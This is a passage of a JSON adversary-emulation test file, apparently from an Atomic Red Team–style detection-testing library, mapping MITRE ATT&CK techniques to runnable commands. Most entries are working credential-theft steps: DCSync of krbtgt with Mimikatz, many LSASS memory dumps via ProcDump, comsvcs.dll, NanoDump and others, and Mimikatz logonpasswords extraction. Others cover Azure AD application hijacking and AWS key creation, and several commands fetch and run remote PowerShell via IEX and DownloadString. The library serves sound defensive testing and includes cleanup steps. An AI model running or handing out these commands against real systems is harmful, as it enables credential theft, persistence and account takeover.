			"elevation_required": true
		},
		"attack_technique": "T1574.001",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "DCSync (Active Directory)",
		"auto_generated_guid": "129efd28-8497-4c87-a1b0-73b9a870ca3e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domain": {
				"description": "Targeted Active Directory domain",
				"type": "string",
				"default": "%userdnsdomain%"
			},
			"user": {
				"description": "Targeted user",
				"type": "string",
				"default": "krbtgt"
			},
			"mimikatz_path": {
				"description": "Mimikatz windows executable",
				"type": "path",
				"default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
				"prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"\n"
		},
		"attack_technique": "T1003.006",
		"phases": ["credential-access"]
	},
	{
		"name": "Run DSInternals Get-ADReplAccount",
		"auto_generated_guid": "a0bced08-3fc5-4d8b-93b7-e8344739376e",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"logonserver": {
				"description": "ComputerName argument default %logonserver%",
				"type": "string",
				"default": "$ENV:logonserver.TrimStart(\"\\\")"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "DSInternals must be installed\n",
				"prereq_command": "$RequiredModule = Get-Module -Name DSInternals -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}\n",
				"get_prereq_command": "Install-Module -Name DSInternals -Scope CurrentUser -Force\n"
			}
		],
		"executor": {
			"command": "Get-ADReplAccount -All -Server #{logonserver}\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1003.006",
		"phases": ["credential-access"]
	},
	{
		"name": "Registry artefact when application use webcam",
		"auto_generated_guid": "6581e4a7-42e3-43c5-a0d2-5a0d62f9702a",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n",
			"cleanup_command": "reg DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /f\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1125",
		"phases": ["collection"]
	},
	{
		"name": "Azure AD Application Hijacking - Service Principal",
		"auto_generated_guid": "b8e747c3-bdf7-4d71-bce2-f1df2a057406",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": "jonh@contoso.com"
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "p4sswd"
			},
			"service_principal_name": {
				"description": "Name of the targeted service principal",
				"type": "string",
				"default": "SuperSP"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AzureAD module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AzureAD -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
			"cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"#{service_principal_name}\" | Select-Object -First 1\n$credz = Get-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from SP\"\n    Remove-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1098.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Azure AD Application Hijacking - App Registration",
		"auto_generated_guid": "a12b5531-acab-4618-a470-0dafb294a87a",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": "jonh@contoso.com"
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "p4sswd"
			},
			"application_name": {
				"description": "Name of the targeted application",
				"type": "string",
				"default": "SuperApp"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AzureAD module must be installed.\n",
				"prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AzureAD -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
			"cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential -ErrorAction Ignore > $null\n\n$app = Get-AzureADApplication -SearchString \"#{application_name}\" | Select-Object -First 1\n$credz = Get-AzureADApplicationKeyCredential -ObjectId $app.ObjectId\nforeach ($cred in $credz) {\n  if ([System.Text.Encoding]::ASCII.GetString($cred.CustomKeyIdentifier) -eq \"AtomicTest\") {\n    Write-Host \"Removed $($cred.KeyId) key from application\"\n    Remove-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -KeyId $cred.KeyId\n  }  \n}\nGet-ChildItem -Path Cert:\\CurrentUser\\My | where { $_.FriendlyName -eq \"AtomicCert\" } | Remove-Item\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1098.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "AWS - Create Access Key and Secret Key",
		"auto_generated_guid": "8822c3b0-d9f9-4daf-a043-491160a31122",
		"supported_platforms": ["iaas:aws"],
		"input_arguments": {
			"username": {
				"description": "Create new AWS access and secret keys for the user",
				"type": "string",
				"default": "atomicredteam"
			}
		},
		"dependencies": [
			{
				"description": "Check if the user exists.\n",
				"prereq_command": "aws iam list-users | grep #{username}\n",
				"get_prereq_command": "echo Please run atomic test T1136.003, before running this atomic\n"
			}
		],
		"executor": {
			"command": "aws iam create-access-key --user-name #{username} > \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\"\ncd \"$PathToAtomicsFolder/T1098.001/bin/\"\n./aws_secret.sh\n",
			"cleanup_command": "access_key=`cat \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\" | jq -r '.AccessKey.AccessKeyId'`\naws iam delete-access-key --access-key-id $access_key --user-name #{username}\nrm \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\"\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1098.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Dump LSASS.exe Memory using ProcDump",
		"auto_generated_guid": "0be2230c-9ab3-4ac2-8826-3199b9a0ebf8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Path where resulting dump should be placed",
				"type": "path",
				"default": "C:\\Windows\\Temp\\lsass_dump.dmp"
			},
			"procdump_exe": {
				"description": "Path of Procdump executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
				"prereq_command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{procdump_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"#{procdump_exe}\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{procdump_exe}\" -accepteula -ma lsass.exe #{output_file}\n",
			"cleanup_command": "del \"#{output_file}\" >nul 2> nul\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump LSASS.exe Memory using comsvcs.dll",
		"auto_generated_guid": "2536dee2-12fb-459a-8c37-971844fa73be",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n",
			"cleanup_command": "Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump LSASS.exe Memory using direct system calls and API unhooking",
		"auto_generated_guid": "7ae7102c-a099-45c8-b985-4c7a2d05790d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dumpert_exe": {
				"description": "Path of Dumpert executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n",
				"prereq_command": "if (Test-Path \"#{dumpert_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory (Split-Path \"#{dumpert_exe}\") -Force | Out-Null\nInvoke-WebRequest \"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" -OutFile \"#{dumpert_exe}\"\n"
			}
		],
		"executor": {
			"command": "\"#{dumpert_exe}\"\n",
			"cleanup_command": "del C:\\windows\\temp\\dumpert.dmp >nul 2> nul\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump LSASS.exe Memory using NanoDump",
		"auto_generated_guid": "dddd4aca-bbed-46f0-984d-e4c5971c51ea",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
				"prereq_command": "if (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\" \n"
			}
		],
		"executor": {
			"command": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"\n",
			"cleanup_command": "del \"%temp%\\nanodump.dmp\" >nul 2> nul\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump LSASS.exe Memory using Windows Task Manager",
		"auto_generated_guid": "dea6c349-f1c6-44f3-87a1-1ed33a59a607",
		"supported_platforms": ["windows"],
		"executor": {
			"steps": "1. Open Task Manager:\n  On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking\n  on the task bar and selecting \"Task Manager\".\n\n2. Select lsass.exe:\n  If lsass.exe is not visible, select \"Show processes from all users\". This will allow you to observe execution of lsass.exe\n  and select it for manipulation.\n\n3. Dump lsass.exe memory:\n  Right-click on lsass.exe in Task Manager. Select \"Create Dump File\". The following dialog will show you the path to the saved file.\n",
			"name": "manual",
			"elevation_required": false
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Offline Credential Theft With Mimikatz",
		"auto_generated_guid": "453acf13-1dbd-47d7-b28a-172ce9228023",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"input_file": {
				"description": "Path of the Lsass dump",
				"type": "path",
				"default": "%tmp%\\lsass.DMP"
			},
			"mimikatz_exe": {
				"description": "Path of the Mimikatz binary",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
				"prereq_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
			},
			{
				"description": "Lsass dump must exist at specified location (#{input_file})\n",
				"prereq_command": "cmd /c \"if not exist #{input_file} (exit /b 1)\"\n",
				"get_prereq_command": "Write-Host \"Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)\"\n"
			}
		],
		"executor": {
			"command": "\"#{mimikatz_exe}\" \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "LSASS read with pypykatz",
		"auto_generated_guid": "c37bc535-5c62-4195-9cc3-0517673171d8",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"venv_path": {
				"description": "Path to the folder for the tactics venv",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_001"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Computer must have python 3 installed\n",
				"prereq_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
			},
			{
				"description": "Computer must have venv configured at #{venv_path}\n",
				"prereq_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "py -m venv \"#{venv_path}\"\n"
			},
			{
				"description": "pypykatz must be installed \n",
				"prereq_command": "if (Get-Command \"#{venv_path}\\Scripts\\pypykatz\" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
				"get_prereq_command": "& \"#{venv_path}\\Scripts\\pip.exe\" install --no-cache-dir pypykatz 2>&1 | Out-Null\n"
			}
		],
		"executor": {
			"command": "\"#{venv_path}\\Scripts\\pypykatz\" live lsa \n",
			"cleanup_command": "del \"%temp%\\nanodump.dmp\" > nul 2> nul\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump LSASS.exe Memory using Out-Minidump.ps1",
		"auto_generated_guid": "6502c8f0-b775-4dbd-9193-1298f56b6781",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump\n",
			"cleanup_command": "Remove-Item $env:TEMP\\lsass_*.dmp -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Create Mini Dump of LSASS.exe using ProcDump",
		"auto_generated_guid": "7cede33f-0acd-44ef-9774-15511300b24b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_file": {
				"description": "Path where resulting dump should be placed",
				"type": "path",
				"default": "C:\\Windows\\Temp\\lsass_dump.dmp"
			},
			"procdump_exe": {
				"description": "Path of Procdump executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
				"prereq_command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{procdump_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"#{procdump_exe}\" -Force\n"
			}
		],
		"executor": {
			"command": "\"#{procdump_exe}\" -accepteula -mm lsass.exe #{output_file}\n",
			"cleanup_command": "del \"#{output_file}\" >nul 2> nul\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Powershell Mimikatz",
		"auto_generated_guid": "66fb0bc1-3c3f-47e9-a298-550ecfefacbc",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"remote_script": {
				"description": "URL to a remote Mimikatz script that dumps credentials",
				"type": "url",
				"default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
			}
		},
		"executor": {
			"command": "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump LSASS with createdump.exe from .Net v5",
		"auto_generated_guid": "9d0072c8-7cca-45c4-bd14-f852cfa35cf0",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": ".Net v5 must be installed\n",
				"prereq_command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n",
				"get_prereq_command": "winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent\n"
			}
		],
		"executor": {
			"command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n& \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id\n",
			"cleanup_command": "Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump LSASS.exe using imported Microsoft DLLs",
		"auto_generated_guid": "86fc3f40-237f-4701-b155-81c01c48d697",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"xordump_exe": {
				"description": "Path to xordump",
				"type": "path",
				"default": "C:\\Windows\\Temp\\xordump.exe"
			},
			"output_file": {
				"description": "Path where resulting dump should be placed",
				"type": "path",
				"default": "C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp"
			}
		},
		"dependencies": [
			{
				"description": "Computer must have xordump.exe\n",
				"prereq_command": "if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile #{xordump_exe}\n"
			}
		],
		"executor": {
			"command": "#{xordump_exe} -out #{output_file} -x 0x41\n",
			"cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump LSASS.exe using lolbin rdrleakdiag.exe",
		"auto_generated_guid": "47a539d1-61b9-4364-bf49-a68bc2a95ef0",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n& $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"\n",
			"cleanup_command": "Remove-Item $env:TEMP\\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump LSASS.exe Memory through Silent Process Exit",
		"auto_generated_guid": "eb5adf16-b601-4926-bca7-dad22adffb37",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_folder": {
				"description": "Folder Path where resulting dump should be placed",
				"type": "path",
				"default": "%temp%\\SilentProcessExit"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
				"prereq_command": "if (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\"\n"
			}
		],
		"executor": {
			"command": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"#{output_folder}\"\n",
			"cleanup_command": "rmdir \"#{output_folder}\" /s /q >nul 2> nul\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.001",
		"phases": ["credential-access"]
	},
	{
		"name": "Set Arbitrary Binary as Screensaver",
